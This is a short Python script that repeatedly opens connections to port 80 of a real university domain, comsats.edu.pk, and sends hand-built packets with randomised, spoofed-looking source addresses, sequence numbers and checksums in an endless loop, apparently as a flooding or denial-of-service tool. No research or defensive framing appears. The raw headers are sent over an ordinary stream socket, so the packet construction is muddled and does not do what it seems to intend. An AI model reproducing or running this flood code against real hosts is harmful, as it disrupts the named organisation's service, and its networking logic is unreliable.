import socket
import struct
import random

target = socket.gethostbyname("comsats.edu.pk")
target_port = 80
i = 1
while True:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, target_port))
    source_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
    source_port = random.randint(1024, 65535)
    seq_num = random.randint(0, 4294967295)
    ack_num = 0
    window_size = random.randint(1024, 65535)
    checksum = random.randint(0, 65535)
    IP_Header = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 500, 0x1234, 0x4000, 64, 6, 0, socket.inet_aton(source_ip), socket.inet_aton(target))
    TCP_Header = struct.pack("!HHLLBBHHH", source_port, target_port, seq_num, ack_num, 5, 0, window_size, checksum, 0)
    https_payload = "GET /index.html HTTP/1.1\r\nHost: www.example.com\r\nUser-Agent: CustomHTTPSClient\r\nAccept: */*\r\n\r\n"
    packet = IP_Header + TCP_Header + https_payload.encode()
    sock.send(packet)
    print(f"PACKET #{i} SENT ✅")
    i += 1